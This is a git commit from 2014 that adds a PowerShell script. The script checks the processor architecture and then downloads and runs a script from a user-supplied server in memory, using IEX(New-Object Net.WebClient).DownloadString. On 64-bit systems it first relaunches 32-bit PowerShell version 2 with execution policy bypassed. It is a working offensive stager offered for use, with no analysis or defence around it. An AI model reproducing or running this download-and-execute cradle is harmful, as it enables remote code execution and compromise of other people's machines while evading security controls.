9c807904db99c9bea050bc6448df53c90e37e13d
root <root@localhost.localdomain>
2014-12-10 16:00:44 -0500

    Add psh_arch , executes ps1 script according to arch

---
+++ psh_arch.ps1
@@ -0,0 +1,33 @@
+# Script to download and execute in memory script available on a web server
+# checks 32 or 64 bit architecure and switches. 32 bit payloads work fine
+# by n0b1dy 2014
+
+ # server-url argument that hosts script to execute
+param ( [string]$server = "" )
+[Byte[]]$sc = $sc32 
+
+$url=$server
+
+ # arch check if x64 execute 32bit version of powershell
+if ($env:Processor_Architecture -ne "x86") 
+{ 
+write-warning "This is 64x, switching to 32x and continuing script." 
+
+#$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+#$encodedCommand = [Convert]::ToBase64String($bytes)
+Write-host "Executing script from $url" -foregroundcolor "green" 
+
+& "C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -version 2 -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString($url)
+
+
+
+exit 
+
+} 
+else  
+{
+Write-host "This is 32x, continuing script." -foregroundcolor "Blue" 
+Write-host "Executing script from $url" -foregroundcolor "green" 
+IEX(New-Object Net.WebClient).DownloadString($url)
+
+}
